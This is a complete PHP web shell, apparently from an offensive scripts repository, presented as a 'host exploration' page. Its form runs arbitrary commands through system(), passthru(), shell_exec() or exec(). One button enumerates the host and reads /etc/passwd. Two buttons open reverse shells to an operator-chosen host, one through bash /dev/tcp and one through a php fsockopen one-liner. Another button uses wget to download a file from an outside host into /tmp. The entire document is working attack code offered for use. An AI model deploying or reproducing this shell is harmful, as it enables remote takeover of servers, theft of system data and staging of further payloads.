<!DOCTYPE html>
<html>
<!-- Simple host exploration script: basic host enumeration using PHP -->
<!-- https://github.com/isabellecda/cyber-scripts -->
<form  method="POST">
	Command:        
	<!-- Commands sent using POST method-->
	<input type="text" name="mycmd">
        <input type="submit" name="btnPost" value="POST">
	<!-- Basic enum commands -->
	<input type="submit" name="btnEnum" value="Auto Enum">
	<br><br>
	Reverse:
	<!-- Will try to get a reverse shell --> 
	<!-- Handler must be listening at the defined host and port -->
	<input type="text" name="lhost" value="10.10.10.10" size="10">
	<input type="text" name="lport" value="1234" size="5">
	<input type="submit" name="btnBash" value="Reverse Bash">
	<input type="submit" name="btnPhp" value="Reverse PHP">
	<br><br>
	HTTP Server:
	<!-- HTTP server must be available at the defined host and port -->
	<!-- File will be download from HTTP server (http://host:port/fileName) to the PHP server (/tmp/fileName) -->
	<input type="text" name="fileHost" value="10.10.10.10" size="10">
	<input type="text" name="filePort" value="1235" size="5">
	<input type="text" name="fileName" value="">
	<input type="submit" name="btnFile" value="Get file">
	<br><br>
	Using:
	<!-- Defines PHP function to sent the comands. Default is system() -->
	<input type="radio" name="radio" value="system" checked="checked">system()
	<input type="radio" name="radio" value="passthru">passthru()
	<input type="radio" name="radio" value="shell_exec">shell_exec()
	<input type="radio" name="radio" value="exec">exec()
	</form>
</html>
<?php
	$lhost = $_REQUEST['lhost'];
	$lport = $_REQUEST['lport'];

	$fileHost = $_REQUEST['fileHost'];
	$filePort = $_REQUEST['filePort'];
	$fileName = $_REQUEST['fileName'];

	$cmdType = $_REQUEST['radio'];

	if (isset($_REQUEST['btnEnum'])) {
		$cmd = "whoami; id; pwd; ip a; cat /etc/passwd";
	} else if (isset($_REQUEST['btnBash'])) {
		$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1'";
	} else if (isset($_REQUEST['btnPhp'])) {
        	$cmd = "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
	} else if (isset($_REQUEST['btnFile'])) {
        	$cmd = "wget http://$fileHost:$filePort/$fileName -O /tmp/$fileName";
    	} else {
		$cmd = $_REQUEST['mycmd'];
	}

	echo ('<br><hr><br>');

        echo("# $cmd");

        echo ('<br><br>');

	if ($cmdType == "passthru") {
		passthru("$cmd 2>&1", $return_value);
	  	($return_value == 0) or die();
	} else if ($cmdType == "shell_exec") {
		echo (shell_exec("$cmd 2>&1"));
	} else if ($cmdType == "exec") {
		exec("$cmd 2>&1", $array);
		foreach ($array as &$value) {
    			echo ($value);;
		}
	} else {
		system("$cmd 2>&1", $return_value);
	  	($return_value == 0) or die();
	}

	
?>
